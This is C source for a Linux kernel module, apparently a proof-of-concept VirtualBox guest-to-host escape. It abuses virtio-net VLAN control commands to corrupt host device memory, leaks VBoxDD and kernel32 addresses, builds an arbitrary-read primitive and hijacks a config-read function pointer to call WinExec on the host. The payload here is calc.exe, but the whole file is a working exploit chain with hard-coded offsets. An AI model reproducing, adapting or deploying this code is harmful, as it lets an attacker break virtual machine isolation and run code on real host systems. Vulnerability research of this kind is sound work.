#include <linux/mman.h>
#include <linux/pci.h>
#include <linux/virtio_net.h>
#include <linux/virtio_pci.h>
#include <linux/module.h>

#define VIRTIO_OFF 0x440

#define VLAN_FILTER_OFF (VIRTIO_OFF + 0xc64)
#define PCI_DEV_INT_OFF 0x22c0
#define FAKE_VIRTIOCORE_OFF 0x21c0
#define FAKE_PCICAP_OFF 0x24c0




#define BAR_OFF 0x4
#define OFFSET_OFF 0x8
#define LENGTH_OFF 0xc

#define OFF_MMIO_OFF 0x0
#define CB_MMIO_OFF 0x2

#define DEV_INS_R3_OFF 0x40
#define PFN_CONFIG_READ_OFF 0x58

#define VIRTQUEUE_SIZE 0x48

#define VIRTQUEUES_OFF 0x20
#define PCI_CFG_DATA_OFF_OFF 0x707
#define VIRTQ_SELECT_OFF 0x70a
#define LOC_COMMON_CFG_CAP_OFF 0x724
#define LOC_DEVICE_CAP_OFF 0x734

#define PAYLOAD_OFF 0x25c0

// Kernel32.so

//#define LOCAL
#ifdef LOCAL
#define CLOSEHANDLE_OFF 0x25060
#define WINEXEC_OFF 0x67780
#else
#define CLOSEHANDLE_OFF 0x24880
#define WINEXEC_OFF 0x65fc0
#endif

// VBoxDD.so

#define CLOSE_HANDLE_IMPORT 0x633058
#define VIRTIO_R3_PCI_CONFIG_READ_OFF 0x3AD960

#define READ_ARG2_C_READ_ARG1_f1 0x6a3f0

#define VIRTIO_REGION_PCI_CAP 2

const char payload_bin[] = "calc.exe";

struct virtio_pci_device {
	struct virtio_device vdev;
	struct pci_dev *pci_dev;
};

static struct virtio_pci_device *to_vp_device(struct virtio_device *vdev) {
	return container_of(vdev, struct virtio_pci_device, vdev);
}

struct control_buf {
	struct virtio_net_ctrl_hdr hdr;
	virtio_net_ctrl_ack status;
	__virtio16 vid;
};

struct virtexp_info {
	struct virtio_device *vdev;
	struct virtio_pci_device *vp_dev;
	struct virtqueue *vqs[3];
	struct control_buf *ctrl;
		u64 VBoxDD_base;
		u64 pDevInsR3;

};

static void write_bits(struct virtexp_info *vi, u16 off, u64 val,
											 unsigned bits) {
	struct scatterlist sgs[3];
	struct scatterlist *psgs[3];
	unsigned tmp;
	unsigned i;

	for (i = 0; i < bits; i++) {
		vi->ctrl->hdr.class = VIRTIO_NET_CTRL_VLAN;
		vi->ctrl->hdr.cmd = (val & (1LL << i) ? VIRTIO_NET_CTRL_VLAN_ADD
																					: VIRTIO_NET_CTRL_VLAN_DEL);
		vi->ctrl->vid = cpu_to_virtio16(vi->vdev, (off - VLAN_FILTER_OFF) * 8 + i);
		vi->ctrl->status = ~0;

		sg_init_one(&sgs[0], &vi->ctrl->hdr, sizeof(vi->ctrl->hdr));
		// Size needs + 3 because there is a bug in VirtualBox
		sg_init_one(&sgs[1], &vi->ctrl->vid, sizeof(vi->ctrl->vid) + 3);
		sg_init_one(&sgs[2], &vi->ctrl->status, sizeof(vi->ctrl->status));

		psgs[0] = &sgs[0];
		psgs[1] = &sgs[1];
		psgs[2] = &sgs[2];

		virtqueue_add_sgs(vi->vqs[2], psgs, 2, 1, vi, GFP_ATOMIC);

		virtqueue_kick(vi->vqs[2]);

		while (!virtqueue_get_buf(vi->vqs[2], &tmp) &&
					 !virtqueue_is_broken(vi->vqs[2]))
			cpu_relax();
	}
}

static void write64(struct virtexp_info *vi, u16 off, u64 val) {
	return write_bits(vi, off, val, 64);
}

static void write32(struct virtexp_info *vi, u16 off, u32 val) {
	return write_bits(vi, off, val, 32);
}

static void write16(struct virtexp_info *vi, u16 off, u16 val) {
	return write_bits(vi, off, val, 16);
}

static void write8(struct virtexp_info *vi, u16 off, u8 val) {
	return write_bits(vi, off, val, 8);
}

static void prepare_read_config(struct virtexp_info *vi, u16 vq_off, u32 off, u32 len) {
	// Fake VIRTIOCORE
	write8(vi, FAKE_VIRTIOCORE_OFF + PCI_CFG_DATA_OFF_OFF, 0);
	write16(vi, FAKE_VIRTIOCORE_OFF + VIRTQ_SELECT_OFF,
					((vq_off) -
					 (FAKE_VIRTIOCORE_OFF + VIRTQUEUES_OFF)) /
							VIRTQUEUE_SIZE);
	write16(vi, FAKE_VIRTIOCORE_OFF + LOC_COMMON_CFG_CAP_OFF + OFF_MMIO_OFF, 0);
	write16(vi, FAKE_VIRTIOCORE_OFF + LOC_COMMON_CFG_CAP_OFF + CB_MMIO_OFF,
					0xffff);
	write16(vi, FAKE_VIRTIOCORE_OFF + LOC_DEVICE_CAP_OFF + OFF_MMIO_OFF, 0);
	write16(vi, FAKE_VIRTIOCORE_OFF + LOC_DEVICE_CAP_OFF + CB_MMIO_OFF, 0);

	// Fake VIRTIO_PCI_CAP_T
	write8(vi, FAKE_PCICAP_OFF + BAR_OFF, VIRTIO_REGION_PCI_CAP);
	write32(vi, FAKE_PCICAP_OFF + OFFSET_OFF, off);
	write32(vi, FAKE_PCICAP_OFF + LENGTH_OFF, len);

	// Partially corrupt pDevInsR3 pointer to cause a type confusion:
	// - pvInstanceDataR3 (0x18) -> pCritSectRoR3 (0x28)
	// - pPciCfgCap (0x1a8) -> pCommonCfgCap (0x1b8)
	write8(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, 0x10);
}

static u32 read_config32(struct virtexp_info *vi, u32 off) {
	u32 val;
	prepare_read_config(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, off, sizeof(val));
	pci_read_config_dword(vi->vp_dev->pci_dev, 0, &val);
	return val;
}
static u32 __read_config32(struct virtexp_info *vi, u32 vq_off, u32 off) {
	u32 val;
	prepare_read_config(vi, PCI_DEV_INT_OFF, off, sizeof(val));
	pci_read_config_dword(vi->vp_dev->pci_dev, 0, &val);
	return val;
}

static u16 read_config16(struct virtexp_info *vi, u32 off) {
	u16 val;
	prepare_read_config(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, off, sizeof(val));
	pci_read_config_word(vi->vp_dev->pci_dev, 0, &val);
	return val;
}


static u8 read_arbitrary_8(struct virtexp_info *vi, u64 addr) {
	unsigned tmp;
	/* Corrupt pDevInsR3 pointer */
	write64(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, addr-0xf1);

	/* Corrupt pfnConfigRead pointer */
	write64(vi, PCI_DEV_INT_OFF + PFN_CONFIG_READ_OFF,
					vi->VBoxDD_base + READ_ARG2_C_READ_ARG1_f1);

	pci_read_config_dword(vi->vp_dev->pci_dev, 0, &tmp);

	/* restore pDevInsR3 pointer and pfnConfigRead Pointer */
	write64(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, vi->pDevInsR3);
	write64(vi, PCI_DEV_INT_OFF + PFN_CONFIG_READ_OFF,
				 vi->VBoxDD_base + VIRTIO_R3_PCI_CONFIG_READ_OFF);

	return	__read_config32(vi, 2, VIRTIO_PCI_COMMON_Q_USEDHI) & 0xff;
}


static u64 read_arbitrary64(struct virtexp_info *vi, u64 addr) {
	u64 r = 0;
	int i;

	for(i = 0; i < 8; ++i)
		r |= ((u64)read_arbitrary_8(vi, addr + i)) << (8 * i);
	return r;
}


static void escape(struct virtexp_info *vi) {
	u64 pDevInsR3;
	u64 virtioR3PciConfigRead;
	u64 VBoxDD_base;
	u64 kernel32_dll;
	unsigned tmp;
	unsigned i;

	/** STAGE 1: Leak pointers **/

	pDevInsR3 = (u64)read_config32(vi, VIRTIO_PCI_COMMON_Q_DESCHI) << 32 |
							(u64)read_config32(vi, VIRTIO_PCI_COMMON_Q_DESCLO);
	pDevInsR3 -= 0x10;
	printk("pDevInsR3: %llx\n", pDevInsR3);
	vi->pDevInsR3 = pDevInsR3;

	virtioR3PciConfigRead =
			(u64)read_config16(vi, VIRTIO_PCI_COMMON_Q_SIZE) << 48 |
			(u64)read_config16(vi, VIRTIO_PCI_COMMON_Q_NOFF) << 32 |
			(u64)read_config16(vi, VIRTIO_PCI_COMMON_Q_ENABLE) << 16 |
			(u64)read_config16(vi, VIRTIO_PCI_COMMON_Q_MSIX);
	printk("virtioR3PciConfigRead: %llx\n", virtioR3PciConfigRead);

	vi->VBoxDD_base = VBoxDD_base = virtioR3PciConfigRead - VIRTIO_R3_PCI_CONFIG_READ_OFF;
	printk("VBoxDD_base: %llx\n", VBoxDD_base);

	/** STAGE 2: Read kernel 32 **/

	kernel32_dll = read_arbitrary64(vi, VBoxDD_base + CLOSE_HANDLE_IMPORT);
	printk("CloseHandle: %llx\n", kernel32_dll);
	kernel32_dll -= CLOSEHANDLE_OFF;
	printk("kernel32.dll: %llx\n", kernel32_dll);


	/** STAGE 3: Code execution **/
	/* Write payload */
	for (i = 0; i < sizeof(payload_bin); i++) {
		write8(vi, PAYLOAD_OFF + i, payload_bin[i]);
	}
	/* Corrupt pDevInsR3 pointer */
	write64(vi, PCI_DEV_INT_OFF + DEV_INS_R3_OFF, pDevInsR3 + PAYLOAD_OFF);
	/* Corrupt pfnConfigRead pointer */
	write64(vi, PCI_DEV_INT_OFF + PFN_CONFIG_READ_OFF, kernel32_dll + WINEXEC_OFF);
	/* Trigger pfnConfigRead dereference */
	pci_read_config_dword(vi->vp_dev->pci_dev, 0, &tmp);
}





static int exploit_probe(struct virtio_device *vdev) {
	static vq_callback_t *callbacks[] = {NULL, NULL, NULL};
	static const char *names[] = {"rx", "tx", "ctrl"};
	struct virtexp_info *vi;
	int ret;

	vi = kzalloc(sizeof(struct virtexp_info), GFP_KERNEL);
	if (!vi) return -ENOMEM;

	vi->ctrl = kzalloc(sizeof(struct control_buf), GFP_KERNEL);
	if (!vi->ctrl) return -ENOMEM;

	vi->vp_dev = to_vp_device(vdev);

	vi->vdev = vdev;
	vdev->priv = vi;

	ret = virtio_find_vqs(vdev, 3, vi->vqs, callbacks, names, NULL);
	if (ret) return ret;

	virtio_device_ready(vdev);

	escape(vi);

	return 0;
}


static void exploit_remove(struct virtio_device *vdev)
{
	struct virtexp_info *vi = vdev->priv;

	vdev->config->reset(vdev);
	vdev->config->del_vqs(vdev);
	kfree(vi->ctrl);
	kfree(vi);
}

static struct virtio_device_id id_table[] = {
	{VIRTIO_ID_NET, VIRTIO_DEV_ANY_ID},
	{0},
};

static struct virtio_driver exploit = {
	.driver.name =  KBUILD_MODNAME,
	.id_table =     id_table,
	.probe =        exploit_probe,
	.remove =       exploit_remove,
};

module_virtio_driver(exploit);
MODULE_DEVICE_TABLE(virtio, id_table);
MODULE_LICENSE("GPL");
